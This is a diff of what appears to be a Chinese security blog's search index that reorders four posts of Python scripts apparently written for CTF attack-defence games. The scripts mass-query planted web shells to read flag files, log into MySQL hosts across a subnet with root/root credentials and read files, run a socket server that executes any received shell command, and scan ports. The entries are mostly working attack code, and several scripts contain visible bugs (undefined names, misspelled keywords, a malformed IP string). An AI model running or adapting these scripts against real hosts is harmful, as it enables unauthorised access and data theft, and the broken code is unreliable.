@@ -495,11 +495,11 @@
     
     
     <entry>
-      <title>【PythonScript】:WebShell</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
+      <title>【PythonScript】:PyMySQL</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
       
-        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>转载请标明出处</strong></em></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -520,11 +520,11 @@
     
     
     <entry>
-      <title>【PythonScript】:PyMySQL</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
+      <title>【PythonScript】:WebShell</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>转载请标明出处</strong></em></p>]]></content>
       
       
       <categories>
@@ -595,11 +595,11 @@
     
     
     <entry>
-      <title>【PythonScript】:RemoteSocket_cmd</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
+      <title>【PythonScript】:PortScanner</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD</p><a id="more"></a><ul><li><strong>Server:</strong></li></ul><pre><code class="language-Python">import socket,osdef main():    global data, s    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind(('127.0.0.1',10001))    s.listen(5)    print(&quot;等待连接中……&quot;)    while True:        conn,addr = s.accept()        while True:            print('收到命令')            data = conn.recv(1024)            cmd = os.popen(data.decode())            os_result = cmd.read()            conn.sendall(os_result.encode('utf8'))if __name__ == '__main__':    main()</code></pre><ul><li><strong>Client:</strong></li></ul><pre><code class="language-Python">import  socketServerIP=('127.0.0.1',10001)try:    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)    s.connect(ServerIP)    print('[+]连接成功')except:    print('[-]服务器无响应')    exit(0)while True:    data=input('[CMD]&gt;&gt;')    s.sendto(bytes(data,encoding='utf8'),ServerIP)    data = s.recv(1024)    print('[+]回显成功')    print(data.decode())</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><a id="more"></a><pre><code class="language-Python">import socketimport threadingfile=open(&quot;port.txt&quot;,'w+')def portscan(port):    host='192.168.174.1'    try:        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        conn=s.connect_ex((host,port))        if conn ==0:            print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post))            file.write(host+&quot;:&quot;+str(post)+&quot;\n&quot;)        else:            pass    excpet:        passfor port in range(1,65535):    t=threading.Thread(target=portscan, args=(port, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -620,11 +620,11 @@
     
     
     <entry>
-      <title>【PythonScript】:PortScanner</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
+      <title>【PythonScript】:RemoteSocket_cmd</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><a id="more"></a><pre><code class="language-Python">import socketimport threadingfile=open(&quot;port.txt&quot;,'w+')def portscan(port):    host='192.168.174.1'    try:        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        conn=s.connect_ex((host,port))        if conn ==0:            print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post))            file.write(host+&quot;:&quot;+str(post)+&quot;\n&quot;)        else:            pass    excpet:        passfor port in range(1,65535):    t=threading.Thread(target=portscan, args=(port, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD</p><a id="more"></a><ul><li><strong>Server:</strong></li></ul><pre><code class="language-Python">import socket,osdef main():    global data, s    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind(('127.0.0.1',10001))    s.listen(5)    print(&quot;等待连接中……&quot;)    while True:        conn,addr = s.accept()        while True:            print('收到命令')            data = conn.recv(1024)            cmd = os.popen(data.decode())            os_result = cmd.read()            conn.sendall(os_result.encode('utf8'))if __name__ == '__main__':    main()</code></pre><ul><li><strong>Client:</strong></li></ul><pre><code class="language-Python">import  socketServerIP=('127.0.0.1',10001)try:    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)    s.connect(ServerIP)    print('[+]连接成功')except:    print('[-]服务器无响应')    exit(0)while True:    data=input('[CMD]&gt;&gt;')    s.sendto(bytes(data,encoding='utf8'),ServerIP)    data = s.recv(1024)    print('[+]回显成功')    print(data.decode())</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
